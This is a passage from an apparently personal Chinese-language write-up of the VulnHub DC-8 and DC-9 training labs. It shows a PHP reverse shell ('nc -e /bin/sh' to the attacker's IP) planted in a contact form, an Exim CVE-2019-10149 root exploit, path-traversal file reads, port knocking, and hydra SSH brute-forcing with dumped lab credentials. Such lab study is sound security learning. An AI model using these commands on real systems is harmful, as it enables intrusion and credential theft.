<p>结果发现<code>Contact Us</code>页面文件可以进行修改</p>
<p>打开看看，发现在<code>edit</code>没有修改的地方</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103142531482.png"><img src="/vulnhub/image-20221103142531482.png" alt="image-20221103142531482"></a></p>
<p>于是找了找网站源码在</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103143057684.png"><img src="/vulnhub/image-20221103143057684.png" alt="image-20221103143057684"></a></p>
<p>这里可以修改，于是我们就修改一下</p>
<p>并记得把编码文件格式改为<code>PHP code</code></p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for taking the time to contact us. We shall be in contact soon.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/sh 192.168.133.140 8888&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103143148817.png"><img src="/vulnhub/image-20221103143148817.png" alt="image-20221103143148817"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103144244656.png"><img src="/vulnhub/image-20221103144244656.png" alt="image-20221103144244656"></a>然后底下保存</p>
<h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><p>然后我们开始监听</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103145521745.png"><img src="/vulnhub/image-20221103145521745.png" alt="image-20221103145521745"></a></p>
<p>访问<code>Contact Us</code>页面发送信息，从而触发php执行命令</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103145747096.png"><img src="/vulnhub/image-20221103145747096.png" alt="image-20221103145747096"></a></p>
<p>拿到<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103145811789.png"><img src="/vulnhub/image-20221103145811789.png" alt="image-20221103145811789"></a></p>
<h2 id="4-提权【exim4】"><a href="#4-提权【exim4】" class="headerlink" title="4.提权【exim4】"></a>4.提权【exim4】</h2><p>先进入交互式<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103145952120.png"><img src="/vulnhub/image-20221103145952120.png" alt="image-20221103145952120"></a></p>
<p>先查看一下<code>suid</code>命令</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103150054750.png"><img src="/vulnhub/image-20221103150054750.png" alt="image-20221103150054750"></a></p>
<p>找到了个新的命令<code>exim4</code>，搜了一下</p>
<blockquote>
<p><code>exim4</code></p>
<p><code>exim</code>远程命令执行漏洞分析（<code>cve-2019-10149</code>）</p>
<p>在对Exim邮件服务器最新改动进行代码审计过程中，我们发现4.87到4.91版本之间的Exim存在一个远程命令执行（RCE）漏洞。这里RCE指的是远程命令执行（Remote Command Execution），而不是远程代码执行（Remote Code Execution）：<code>攻击者可以以root权限使用execv()来执行任意命令，利用过程中不涉及到内存破坏或者ROP（Return-Oriented Programming）相关内容。</code></p>
<p>这个漏洞可以由本地攻击者直接利用（远程攻击者需要在特定的非默认配置下利用）。为了在默认配置下远程利用该漏洞，攻击者需要与存在漏洞的服务器建连7天（可以每隔几分钟发送1个字节）。然而由于Exim的代码非常复杂，我们无法保证这里介绍的方法是唯一的利用方法，可能还存在其他更加快捷的方法。</p>
<p>从4.87版开始（2016年4月6日公布），由于#ifdef EXPERIMENTAL_EVENT改成了#ifndef DISABLE_EVENT，因此Exim默认情况下就存在漏洞。在之前的版本中，如果手动启用了EXPERIMENTAL_EVENT选项，那么服务器也会存在漏洞。令人惊讶的是，这个漏洞已经在4.92版中被修复（2019年2月10日）：</p>
</blockquote>
<p>根据文档，发现是个和邮件服务有关的命令，并且存在命令执行漏洞</p>
<p>我们先查看一下其版本是否在这个<code>nday</code>的范围里</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103150517673.png"><img src="/vulnhub/image-20221103150517673.png" alt="image-20221103150517673"></a></p>
<p>发现刚好是这个版本范围，是存在<code>RCE</code></p>
<p>查看一下有没有利用的脚本</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103151738985.png"><img src="/vulnhub/image-20221103151738985.png" alt="image-20221103151738985"></a></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Privilege：特权</span><br></pre></td></tr></table></figure>

<p>选择<code>46996.sh</code>，我们查看一下脚本文件内容</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit <span class="number">46996</span> -p  </span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103151838092.png"><img src="/vulnhub/image-20221103151838092.png" alt="image-20221103151838092"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103152003846.png"><img src="/vulnhub/image-20221103152003846.png" alt="image-20221103152003846"></a></p>
<p>发现有两个使用方法，一个<code>setuid</code>，一个<code>netcat</code></p>
<p>主要是上传到靶机<code>shell</code>后，执行命令不同</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br><span class="line">或</span><br><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>





<p>我们先把脚本文件复制下来</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103152351530.png"><img src="/vulnhub/image-20221103152351530.png" alt="image-20221103152351530"></a></p>
<p>再上传到靶机<code>shell</code></p>
<p><code>kali</code>主机执行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">9999</span> &lt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103152714451.png"><img src="/vulnhub/image-20221103152714451.png" alt="image-20221103152714451"></a></p>
<p>靶机<code>shell</code>中执行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> <span class="number">192.168.133.140</span> <span class="number">9999</span> &gt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103153550325.png"><img src="/vulnhub/image-20221103153550325.png" alt="image-20221103153550325"></a></p>
<p>发现权限不够，看来是不能在这个页面新建文件</p>
<p>我们到<code>/tmp</code>目录下一般可以</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103153658085.png"><img src="/vulnhub/image-20221103153658085.png" alt="image-20221103153658085"></a></p>
<p>下载成功</p>
<p>执行提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103153740349.png"><img src="/vulnhub/image-20221103153740349.png" alt="image-20221103153740349"></a></p>
<p>发现无执行权限，我们修改一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">777</span> raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103153901179.png"><img src="/vulnhub/image-20221103153901179.png" alt="image-20221103153901179"></a></p>
<p>成功执行脚本</p>
<hr>
<h3 id="意外"><a href="#意外" class="headerlink" title="意外"></a>意外</h3><p>但结果发现还是</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103154130346.png"><img src="/vulnhub/image-20221103154130346.png" alt="image-20221103154130346"></a></p>
<p>低权限账号</p>
<p>于是我们再执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>

<p>结果还是一样</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103155324498.png"><img src="/vulnhub/image-20221103155324498.png" alt="image-20221103155324498"></a></p>
<p>而且提醒在靶机的<code>31337</code>端口连接关闭了</p>
<p>看了看其他大佬的<code>wp</code></p>
<p>发现有一步【其实是没必要的】</p>
<blockquote>
<p>在脚本文件里执行<br>说是因为这个脚本是<code>windows</code>底下编写的，所以需要修改一下，改成<code>Linux</code><br><code>set ff=unix</code></p>
</blockquote>
<p>结果还是一样，看来是靶机有问题了，猜测是靶机和<code>kali</code>主机之间连接有问题，我换手机热点试试</p>
<hr>
<p>成功【校园网真垃圾】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103160625006.png"><img src="/vulnhub/image-20221103160625006.png" alt="image-20221103160625006"></a></p>
<p>到根目录查看<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103160824407.png"><img src="/vulnhub/image-20221103160824407.png" alt="image-20221103160824407"></a></p>
<p>得到<code>flag</code></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br></pre></td></tr></table></figure>

<p><code>Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m also sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>This challenge was largely based on two things:</code></p>
<ol>
<li><code>A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</code></li>
<li><code>A suggestion from @theart42</code></li>
</ol>
<p><code>The answer to that question is...</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>希望你喜欢 DC-8。只是想向所有这些人表示衷心的感谢<br>提供反馈的人，以及所有花时间完成这些小事的人<br>挑战。</p>
<p>我还要特别感谢：</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@心42</p>
<p>这一挑战主要基于两件事：</p>
<ol>
<li>我从有人询问关于 Linux 机器上的 2FA 以及它是否值得的一条推文。</li>
<li>来自@theart42 的建议</li>
</ol>
<p>这个问题的答案是……</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p>【注意，这个提权不稳定，所以需要快点拿取<code>flag</code>，或者按我之前写的方法进入稳定<code>shell</code>】</p>
<hr>
<h3 id="p-s-setuid"><a href="#p-s-setuid" class="headerlink" title="p.s. setuid"></a>p.s. setuid</h3><p>我再试试另外一个命令试试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103161221325.png"><img src="/vulnhub/image-20221103161221325.png" alt="image-20221103161221325"></a></p>
<p>发现还是一样</p>
<p>查了一下</p>
<blockquote>
<p><code>setuid</code></p>
<p><code>setuid</code>是类unix系统提供的一个标志位， 其实际意义是set一个process的euid为这个可执行文件或程序的拥有者(比如root)的uid， 也就是说当setuid位被设置之后， 当文件或程序(统称为executable)被执行时, 操作系统会赋予文件所有者的权限, 因为其euid是文件所有者的uid.</p>
</blockquote>
<p>而且我们执行完发现生成了两个<code>pwn</code>文件【狂喜，最近正好在学习<code>pwn</code>】</p>
<p>查了一下<code>setuid</code>在<code>pwn</code>中的利用</p>
<h4 id="在pwn中"><a href="#在pwn中" class="headerlink" title="在pwn中"></a>在pwn中</h4><p><code>什么是setuid？</code></p>
<blockquote>
<p><code>setuid</code>代表设置用户身份，并且<code>setuid</code>设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配</p>
</blockquote>
<p>这么说起来有点绕，我们来举一个例子</p>
<blockquote>
<p>一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了</p>
</blockquote>
<p>演示<br>我们用<code>user</code>用户运行一个<code>vim</code><br>然后新开一个窗口查看后台进程</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -<span class="built_in">aux</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103162544585.png"><img src="/vulnhub/image-20221103162544585.png" alt="image-20221103162544585"></a></p>
<p>这里可以看到，我们的<code>vim</code>正在以<code>user</code>的权限运行中，然后我们去执行一下<code>setuid</code>文件看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103162848360.png"><img src="/vulnhub/image-20221103162848360.png" alt="image-20221103162848360"></a></p>
<p>这里可以看到，我们虽然是<code>user</code>用户，但执行文件后，文件正以<code>root</code>权限运行<br>我们查看文件的权限</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103162937431.png"><img src="/vulnhub/image-20221103162937431.png" alt="image-20221103162937431"></a></p>
<blockquote>
<p><code>r</code>代表读，<code>w</code>代表写，<code>x</code>代表执行，那<code>s</code>是什么呢</p>
</blockquote>
<p><code>s</code>替换了以<code>x</code>的可执行文件，这被称为<code>setuid</code>位，根据刚刚的操作，应该知道了<code>s</code>是做什么的</p>
<p>当这个位被<code>user</code>权限的用户执行时，<code>linux</code>实际上是以文件的创造者的权限运行的，在这种情况下，它是以<code>root</code>权限运行的</p>
<p><strong>我们的目标就是，破解(pwn)这些文件然后拿到<code>root</code>权限读取<code>flag</code></strong></p>
<p>这也就是这个命令执行的目的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>



<blockquote>
<p>简而言之，其实就是<code>suid</code>提权</p>
<p>但这里可能是因为靶机的原因无法执行提权成功</p>
</blockquote>
<hr>
<p>总而言之，这一关只是在<code>DC2</code>上修改了一点，只要把前面几关做了，这关难度并不大</p>
<p>【</p>
<p>难受的是遇到<code>pwn</code>，虽然在这里并没有什么用，但是如果遇到这类二进制文件如何修改才能让其成为我们提权的工具，</p>
<p>而且现在二进制还啥也不会，继续学习吧</p>
<p>】</p>
<p><strong>一个旗子找完，游戏结束【吐血了】</strong></p>
<hr>
<h1 id="九、DC9-中级"><a href="#九、DC9-中级" class="headerlink" title="九、DC9[中级]"></a>九、DC9[中级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p>（dc最后一关）建议可以自己想办法做一下，如果之前是靠别人wp来提供思路的话</p>
</blockquote>
<h2 id="信息收集-8"><a href="#信息收集-8" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用<code>nmap</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103191148810.png"><img src="/vulnhub/image-20221103191148810.png" alt="image-20221103191148810"></a></p>
<p>结果发现只有<code>80</code>端口是打开的</p>
<p>而且也没有什么敏感的信息</p>
<p>然后再<code>dirsearch</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103191356470.png"><img src="/vulnhub/image-20221103191356470.png" alt="image-20221103191356470"></a></p>
<p>结果没有什么有价值的东西</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103191535378.png"><img src="/vulnhub/image-20221103191535378.png" alt="image-20221103191535378"></a></p>
<p>在<code>wappalyzer</code>里也看不出什么信息，<code>CMS</code>也没显示</p>
<h2 id="1-sql注入-1"><a href="#1-sql注入-1" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>啥也没有信息，但是在<code>display all records</code>下</p>
<p>我们看到一大串枚举数据，很熟悉，这和<code>sql</code>注入感觉有很大的关系</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103195324565.png"><img src="/vulnhub/image-20221103195324565.png" alt="image-20221103195324565"></a></p>
<p>找了一下发现<code>url</code>并没有<code>sql</code>注入的方式，那就可能是输入框进行<code>sql</code>注入了</p>
<p>根据枚举的数据，猜测是在<code>search</code>下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200048490.png"><img src="/vulnhub/image-20221103200048490.png" alt="image-20221103200048490"></a></p>
<p>我们直接抓包数据，拿<code>sqlmap</code>梭哈</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200315686.png"><img src="/vulnhub/image-20221103200315686.png" alt="image-20221103200315686"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200434113.png"><img src="/vulnhub/image-20221103200434113.png" alt="image-20221103200434113"></a></p>
<p>好家伙真的是<code>sql</code>注入</p>
<p>后面不赘述，找到并查看<code>users</code>数据库中用户信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200557398.png"><img src="/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></a></p>
<p>好家伙，完全没有对密码加密</p>
<p>但是根据登录页面，是需要管理员账号的，再根据<code>staff</code>，看来我是找错表了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200743790.png"><img src="/vulnhub/image-20221103200743790.png" alt="image-20221103200743790"></a></p>
<p>于是按上面一样步骤，查看<code>Staff</code>数据库里的信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103201409346.png"><img src="/vulnhub/image-20221103201409346.png" alt="image-20221103201409346"></a></p>
<p>果然在这里</p>
<blockquote>
<p><code>transorbital1</code><br>我开始以为是啥密钥，结果是密码明文，麻了</p>
<p>当然时间充足的兄弟可以hashcat试试【坏笑】</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103202130464.png"><img src="/vulnhub/image-20221103202130464.png" alt="image-20221103202130464"></a></p>
<p>成功登录</p>
<h2 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2.文件包含"></a>2.文件包含</h2><p>发现多了两个选项是，一个是增加用户，另一个是登出账号</p>
<p>但是我突然发现</p>
<p>底下莫名多了一行字</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> does not <span class="keyword">exist</span></span><br></pre></td></tr></table></figure>

<p>？？？</p>
<p>哪里来的<code>file</code>，看来是进行了读取文件操作，但是文件参数不存在</p>
<p>猜测可能存在文件包含漏洞</p>
<p>于是我们在<code>url</code>后加上<code>?file=</code>进行文件包含</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/passwd</code><br>返回到根目录下，包含&#x2F;etc目录下的passwd文件</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103205431449.png"><img src="/vulnhub/image-20221103205431449.png" alt="image-20221103205431449"></a></p>
<p>但这里并没有我们想要的信息，</p>
<h2 id="3-ssh"><a href="#3-ssh" class="headerlink" title="3.ssh"></a>3.ssh</h2><h3 id="1）-knockd"><a href="#1）-knockd" class="headerlink" title="1） knockd"></a>1） knockd</h3><blockquote>
<p>在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。</p>
<p>端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到<del>Internet</del>，则可以使用端口断开功能。<br>它允许您关闭防火墙上允许传入连接的端口，并在进行<code>预先安排的连接尝试</code>方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。</p>
</blockquote>
<p>我在学习笔记写有其原理，可以看看，我不在这里赘述</p>
<p>先查看敲门顺序</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/knockd.conf</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103213357210.png"><img src="/vulnhub/image-20221103213357210.png" alt="image-20221103213357210"></a></p>
<p>发现是</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">7469</span>,<span class="number">8475</span>,<span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p>敲一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.133.149</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103214033662.png"><img src="/vulnhub/image-20221103214033662.png" alt="image-20221103214033662"></a></p>
<p>然后再用<code>nmap</code>扫一下，发现<code>22</code>端口开了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103214022727.png"><img src="/vulnhub/image-20221103214022727.png" alt="image-20221103214022727"></a></p>
<h3 id="2）-hydra"><a href="#2）-hydra" class="headerlink" title="2） hydra"></a>2） hydra</h3><p>然后我们用九头蛇爆破登录一下<code>ssh</code></p>
<p>至于账户密码就用我们之前<code>sql</code>注入得到的第一个的数据</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200557398.png"><img src="/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></a></p>
<blockquote>
<p>username：<br><code>marym</code><br><code>julied</code><br><code>fredf</code><br><code>barneyr</code><br><code>tomc</code><br><code>jerrym</code><br><code>wilmaf</code><br><code>bettyr</code><br><code>chandlerb</code><br><code>joeyt</code><br><code>rachelg</code><br><code>rossg</code><br><code>monicag</code><br><code>phoebeb</code><br><code>scoots</code><br><code>janitor</code><br><code>janitor2</code></p>
</blockquote>
<blockquote>
<p>password：<br><code>3kfs86sfd</code><br><code>468sfdfsd2</code><br><code>4sfd87sfd1</code><br><code>RocksOff</code><br><code>TC&amp;TheBoyz</code><br><code>B8m#48sd</code><br><code>Pebbles</code><br><code>BamBam01</code><br><code>UrAG0D!</code><br><code>Passw0rd</code><br><code>yN72#dsd</code><br><code>ILoveRachel</code><br><code>3248dsds7s</code><br><code>smellycats</code><br><code>YR3BVxxxw87</code><br><code>Ilovepeepee</code><br><code>Hawaii-Five-0</code></p>
</blockquote>
<p>把<code>username</code>和<code>password</code>复制到两个文本文件中去</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103215414559.png"><img src="/vulnhub/image-20221103215414559.png" alt="image-20221103215414559"></a></p>
<p>发现有三个可以登录</p>
<blockquote>
<p>login: <code>chandlerb</code>   password: <code>UrAG0D!</code><br>login: <code>joeyt</code>   password: <code>Passw0rd</code><br>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p>我们先登录<code>janitor</code></p>
<blockquote>
<p>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165102940.png"><img src="/vulnhub/image-20221104165102940.png" alt="image-20221104165102940"></a></p>
<p>登录成功</p>
<h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>先执行 </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p>看看当前用户能以管理员身份执行哪些命令</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165528505.png"><img src="/vulnhub/image-20221104165528505.png" alt="image-20221104165528505"></a></p>
<p>看来我们没有资格</p>
<p>再执行</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure>

<p>查看当前用户目录文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165145529.png"><img src="/vulnhub/image-20221104165145529.png" alt="image-20221104165145529"></a></p>
<p>发现有个</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">secrets-for-putin</span></span><br></pre></td></tr></table></figure>

<p>可能有管理员密码什么的</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165242513.png"><img src="/vulnhub/image-20221104165242513.png" alt="image-20221104165242513"></a></p>
<p>果然有个文本文件，查看</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> passwords-found-<span class="keyword">on</span>-<span class="keyword">post</span>-it-<span class="keyword">notes</span>.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165331378.png"><img src="/vulnhub/image-20221104165331378.png" alt="image-20221104165331378"></a></p>
<p>又多了几个密码</p>
<blockquote>
<p><code>BamBam01</code><br><code>Passw0rd</code><br><code>smellycats</code><br><code>P0Lic#10-4</code><br><code>B4-Tru3-001</code><br><code>4uGU5T-NiGHts</code></p>
</blockquote>
<p>我们把这个补充到我们九头蛇爆破的密码本里</p>
<p>再进行爆破<code>ssh</code></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p>我们发现多了一个新的账号</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165738669.png"><img src="/vulnhub/image-20221104165738669.png" alt="image-20221104165738669"></a></p>
<blockquote>
<p>login: <code>fredf</code>   password: <code>B4-Tru3-001</code></p>
</blockquote>
<p>我们登录<code>ssh</code>看看</p>
<p>再执行</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165927452.png"><img src="/vulnhub/image-20221104165927452.png" alt="image-20221104165927452"></a></p>
<p>发现其可以以无密码<code>root</code>权限执行</p>
